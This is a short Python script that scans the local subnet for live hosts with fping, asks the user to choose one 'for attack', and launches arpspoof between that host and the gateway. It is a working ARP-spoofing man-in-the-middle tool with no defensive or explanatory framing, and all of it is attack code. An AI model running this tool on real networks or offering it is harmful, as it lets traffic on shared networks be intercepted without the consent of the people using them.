#!/usr/bin/env python
# coding=utf-8
import subprocess
import re
import time

def GetNetwork():
    Res = subprocess.Popen("route",shell=True,stdout=subprocess.PIPE)
    stdoutput = Res.communicate()
    pattern = stdoutput[0]
    out = pattern.split()
    network = out[20]
    iface = out[27]
    GateWay = out[11]
    return network,iface,GateWay

def MakeCommand():
    network = GetNetwork()
    command0 = 'touch 433wifi.txt'
    command1 = network[0]+'/24'
    command2 = 'fping '+'-ag '+command1+' > '+'433wifi.txt '
    subprocess.Popen(command0,shell=True)
    p =  subprocess.Popen(command2,shell=True) 
    p.wait()
    Content = Read_File('433wifi.txt')
    return Content

def Read_File(File_name):
    cmd = 'cat '+File_name
    Res = subprocess.Popen(cmd,shell = True,stdout=subprocess.PIPE)
    stdoutput = Res.communicate()
    Content = stdoutput[0]
    out = Content.split()
    return out

def Attack():
    Net_info = GetNetwork()
    Iface = Net_info[1]
    GateWay = Net_info[2]
    IP_Pool = MakeCommand()
    a=0
    for ip in IP_Pool:
        print ("%d:%s"%(a,ip))
        a+=1
    i = raw_input("Choose ip for attack:")
    i=int(i)
    Attack_IP = IP_Pool[i]
    cmd = 'arpspoof '+'-i '+Iface+' -t '+ Attack_IP +' '+GateWay
    subprocess.Popen(cmd,shell=True)
Attack()

